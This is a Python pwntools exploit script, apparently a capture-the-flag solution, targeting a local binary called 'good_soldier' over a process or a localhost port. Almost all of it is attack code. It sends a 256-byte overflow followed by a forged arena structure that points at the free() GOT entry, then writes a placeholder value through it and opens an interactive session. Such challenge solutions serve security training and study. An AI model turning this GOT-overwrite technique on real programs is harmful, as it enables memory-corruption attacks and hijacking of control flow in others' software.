#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('../src/build/good_soldier')
context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']


if args.REMOTE:
    libc = ELF('../infra/libc.so.6')
    HOST = "127.0.0.1"
    PORT = 1337
    io = remote(HOST, PORT)
else:
    libc = elf.libc
    gs = """
    b *game_instance+406
    continue
    """
    io = process(cwd="../src")
    gdb.attach(io)

context.log_level = 'debug'

io.sendlineafter(b'> ', b'foobar')
io.recvuntil(b'do ?')
io.sendlineafter(b'> ', b'2')

offset_arena = 256
free_got = elf.got["free"]

cursor = 0
capacity = 32
fake_arena = p64(free_got) + p64(cursor) + p64(capacity)

payload = b'A' * offset_arena + fake_arena

io.sendlineafter(b'> ', payload)
io.sendlineafter(b': ', p64(0xdeadbeef))

io.interactive()

